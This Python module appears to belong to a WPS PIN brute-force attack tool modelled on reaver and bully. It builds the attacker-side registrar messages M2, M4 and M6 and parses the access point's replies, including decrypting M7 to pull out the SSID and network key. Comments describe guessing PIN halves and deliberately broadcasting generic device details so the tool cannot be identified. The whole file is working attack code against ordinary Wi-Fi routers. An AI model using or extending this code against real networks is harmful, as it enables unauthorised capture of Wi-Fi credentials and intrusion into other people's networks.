"""Build/parse the M1-M8 WSC messages (Registrar/attacker side only: we
build M2/M4/M6 and parse M1/M3/M5/M7, plus NACK).

Field layout for M2 mirrors what wpa_supplicant's registrar sends
(device-info "Description" bundle + nonces + pubkey + Authenticator);
exact cosmetic values (manufacturer string etc.) don't affect protocol
correctness. M4/M6 need only the crypto-relevant attributes per the
message table in research/PORT_FROM_V1.md-referenced Viehböck paper.
"""

from __future__ import annotations

from dataclasses import dataclass

from . import tlv
from .crypto import DerivedKeys, authenticator, key_wrap_decrypt, key_wrap_encrypt, proof_hash


def _device_info_tlvs() -> list[tuple[int, bytes]]:
    return [
        # Advertise all auth/encr flags like reaver/bully — some AP firmware
        # rejects a registrar that doesn't claim compatibility with the AP's
        # own beacon capabilities. Mirrors reaver's M2 capture exactly.
        (tlv.ATTR_AUTH_TYPE_FLAGS, b"\x00\x3f"),  # Open | WPAPSK | Shared | WPA | WPA2 | WPA2PSK
        (tlv.ATTR_ENCR_TYPE_FLAGS, b"\x00\x0f"),  # None | WEP | TKIP | AES
        (tlv.ATTR_CONN_TYPE_FLAGS, b"\x01"),  # ESS
        # 0x008c matches reaver's M2 (PBC + PHY/DISP pushbutton methods);
        # for a PIN attack the Keypad bit alone (0x0100) is semantically
        # correct, but real tools broadcast broader method support.
        (tlv.ATTR_CONFIG_METHODS, b"\x00\x8c"),
        # Generic/inert values — this is broadcast to the target AP in the
        # clear on every attempt, so it must never identify this project.
        (tlv.ATTR_MANUFACTURER, b"Unknown"),
        (tlv.ATTR_MODEL_NAME, b"Unknown"),
        (tlv.ATTR_MODEL_NUMBER, b"1.0"),
        (tlv.ATTR_SERIAL_NUMBER, b"00000000"),
        (tlv.ATTR_PRIMARY_DEV_TYPE, b"\x00\x01\x00\x50\xf2\x04\x00\x01"),
        (tlv.ATTR_DEVICE_NAME, b"Unknown"),
        (tlv.ATTR_RF_BANDS, b"\x01"),
        (tlv.ATTR_ASSOC_STATE, b"\x00\x00"),
        (tlv.ATTR_DEV_PASSWORD_ID, b"\x00\x00"),  # PIN
        (tlv.ATTR_CONFIG_ERROR, b"\x00\x00"),
        (tlv.ATTR_OS_VERSION, b"\x80\x00\x00\x01"),
        (tlv.ATTR_VENDOR_EXT, tlv.WFA_VENDOR_ID + bytes([tlv.WFA_ELEM_VERSION2, 1, tlv.WPS_VERSION2])),
    ]


def build_assoc_wps_ie(uuid_e: bytes) -> bytes:
    """WPS vendor IE (802.11 element ID 221 payload, OUI+type prefix
    included) for the 802.11 Association Request.

    This is what marks the association as WPS provisioning — Request
    Type = Enrollee — rather than a normal client connection. A
    WPS-capable AP uses this to decide whether to route the following
    EAPOL-Start into its WSC registrar state machine at all; omitting it
    is a real, observed reason a real AP can 802.11-associate us cleanly
    and then simply never answer EAPOL-Start (reads as a plain timeout,
    indistinguishable from "no WPS" without inspecting the exchange).
    Field values mirror the PIN/Keypad device-info bundle already used
    for M2 (_device_info_tlvs above) for consistency, not because the
    AP cares about their exact content at this stage.
    """
    body = tlv.encode_tlvs(
        (tlv.ATTR_VERSION, b"\x10"),
        (tlv.ATTR_REQUEST_TYPE, b"\x01"),  # Enrollee, open 802.1X
        (tlv.ATTR_CONFIG_METHODS, b"\x01\x00"),  # Keypad
        (tlv.ATTR_UUID_E, uuid_e),
        (tlv.ATTR_PRIMARY_DEV_TYPE, b"\x00\x01\x00\x50\xf2\x04\x00\x01"),
        (tlv.ATTR_RF_BANDS, b"\x01"),
        (tlv.ATTR_ASSOC_STATE, b"\x00\x00"),  # NotAssociated
        (tlv.ATTR_CONFIG_ERROR, b"\x00\x00"),  # NoError
        (tlv.ATTR_DEV_PASSWORD_ID, b"\x00\x00"),  # PIN
        (tlv.ATTR_VENDOR_EXT, tlv.WFA_VENDOR_ID + bytes([tlv.WFA_ELEM_VERSION2, 1, tlv.WPS_VERSION2])),
    )
    return tlv.WPS_VENDOR_OUI_TYPE + body


def build_m2(n1: bytes, n2: bytes, uuid_r: bytes, pkr: bytes, prev_msg: bytes, auth_key: bytes) -> bytes:
    """Build M2 (without Authenticator), sign it, append Authenticator."""
    body = tlv.encode_tlvs(
        (tlv.ATTR_VERSION, b"\x10"),
        (tlv.ATTR_MSG_TYPE, bytes([tlv.WPS_M2])),
        (tlv.ATTR_ENROLLEE_NONCE, n1),
        (tlv.ATTR_REGISTRAR_NONCE, n2),
        (tlv.ATTR_UUID_R, uuid_r),
        (tlv.ATTR_PUBLIC_KEY, pkr),
        *_device_info_tlvs(),
    )
    mac = authenticator(auth_key, prev_msg, body)
    return body + tlv.encode_tlv(tlv.ATTR_AUTHENTICATOR, mac)


def build_m4(
    n1: bytes, r_hash1: bytes, r_hash2: bytes, r_s1: bytes, key_wrap_key: bytes,
    prev_msg: bytes, auth_key: bytes,
) -> bytes:
    """Build M4: proves possession attempt of the 1st PIN half."""
    encrypted = key_wrap_encrypt(key_wrap_key, r_s1)
    body = tlv.encode_tlvs(
        (tlv.ATTR_VERSION, b"\x10"),
        (tlv.ATTR_MSG_TYPE, bytes([tlv.WPS_M4])),
        (tlv.ATTR_ENROLLEE_NONCE, n1),
        (tlv.ATTR_R_HASH1, r_hash1),
        (tlv.ATTR_R_HASH2, r_hash2),
        (tlv.ATTR_ENCR_SETTINGS, encrypted),
    )
    mac = authenticator(auth_key, prev_msg, body)
    return body + tlv.encode_tlv(tlv.ATTR_AUTHENTICATOR, mac)


def build_m6(n1: bytes, r_s2: bytes, key_wrap_key: bytes, prev_msg: bytes, auth_key: bytes) -> bytes:
    """Build M6: proves possession attempt of the 2nd PIN half."""
    encrypted = key_wrap_encrypt(key_wrap_key, r_s2)
    body = tlv.encode_tlvs(
        (tlv.ATTR_VERSION, b"\x10"),
        (tlv.ATTR_MSG_TYPE, bytes([tlv.WPS_M6])),
        (tlv.ATTR_ENROLLEE_NONCE, n1),
        (tlv.ATTR_ENCR_SETTINGS, encrypted),
    )
    mac = authenticator(auth_key, prev_msg, body)
    return body + tlv.encode_tlv(tlv.ATTR_AUTHENTICATOR, mac)


def compute_r_hashes(auth_key: bytes, r_s1: bytes, r_s2: bytes, psk1: bytes, psk2: bytes, pke: bytes, pkr: bytes) -> tuple[bytes, bytes]:
    """R-Hash1/R-Hash2 = proof_hash keyed on our (possibly wrong) PIN-half guess."""
    return (
        proof_hash(auth_key, r_s1, psk1, pke, pkr),
        proof_hash(auth_key, r_s2, psk2, pke, pkr),
    )


@dataclass
class M1Info:
    n1: bytes
    pke: bytes
    mac_addr: bytes
    ap_setup_locked: bool
    raw: bytes


def parse_m1(tlv_data: bytes) -> M1Info | None:
    attrs = tlv.decode_tlvs(tlv_data)
    msg_type = attrs.get(tlv.ATTR_MSG_TYPE)
    n1 = attrs.get(tlv.ATTR_ENROLLEE_NONCE)
    pke = attrs.get(tlv.ATTR_PUBLIC_KEY)
    mac_addr = attrs.get(tlv.ATTR_MAC_ADDR)
    if msg_type != bytes([tlv.WPS_M1]) or n1 is None or pke is None or mac_addr is None:
        return None
    locked = attrs.get(tlv.ATTR_AP_SETUP_LOCKED, b"\x00") != b"\x00"
    return M1Info(n1=n1, pke=pke, mac_addr=mac_addr, ap_setup_locked=locked, raw=tlv_data)


@dataclass
class M3Info:
    e_hash1: bytes
    e_hash2: bytes


def parse_m3(tlv_data: bytes) -> M3Info | None:
    attrs = tlv.decode_tlvs(tlv_data)
    if attrs.get(tlv.ATTR_MSG_TYPE) != bytes([tlv.WPS_M3]):
        return None
    e_hash1 = attrs.get(tlv.ATTR_E_HASH1)
    e_hash2 = attrs.get(tlv.ATTR_E_HASH2)
    if e_hash1 is None or e_hash2 is None:
        return None
    return M3Info(e_hash1=e_hash1, e_hash2=e_hash2)


def is_m3(tlv_data: bytes) -> bool:
    return tlv.decode_tlvs(tlv_data).get(tlv.ATTR_MSG_TYPE) == bytes([tlv.WPS_M3])


def is_m5(tlv_data: bytes) -> bool:
    return tlv.decode_tlvs(tlv_data).get(tlv.ATTR_MSG_TYPE) == bytes([tlv.WPS_M5])


def is_m7(tlv_data: bytes) -> bool:
    return tlv.decode_tlvs(tlv_data).get(tlv.ATTR_MSG_TYPE) == bytes([tlv.WPS_M7])


@dataclass
class M7Credentials:
    ssid: str | None
    network_key: str | None


def parse_m7(tlv_data: bytes, key_wrap_key: bytes) -> M7Credentials | None:
    """M7 success: decrypt Encrypted Settings -> E-S2 || ConfigData, pull creds."""
    attrs = tlv.decode_tlvs(tlv_data)
    if attrs.get(tlv.ATTR_MSG_TYPE) != bytes([tlv.WPS_M7]):
        return None
    enc = attrs.get(tlv.ATTR_ENCR_SETTINGS)
    if enc is None:
        return None
    try:
        plaintext = key_wrap_decrypt(key_wrap_key, enc)
    except ValueError:
        return None
    config_data = plaintext[16:]  # skip E-S2 (128 bits)
    cfg_attrs = tlv.decode_tlvs(config_data)
    if tlv.ATTR_CRED in cfg_attrs:
        cfg_attrs = tlv.decode_tlvs(cfg_attrs[tlv.ATTR_CRED])
    ssid = cfg_attrs.get(tlv.ATTR_SSID)
    key = cfg_attrs.get(tlv.ATTR_NETWORK_KEY)
    return M7Credentials(
        ssid=ssid.decode(errors="replace") if ssid else None,
        network_key=key.decode(errors="replace") if key else None,
    )


def nack_config_error(tlv_data: bytes) -> int | None:
    attrs = tlv.decode_tlvs(tlv_data)
    err = attrs.get(tlv.ATTR_CONFIG_ERROR)
    return int.from_bytes(err, "big") if err else None
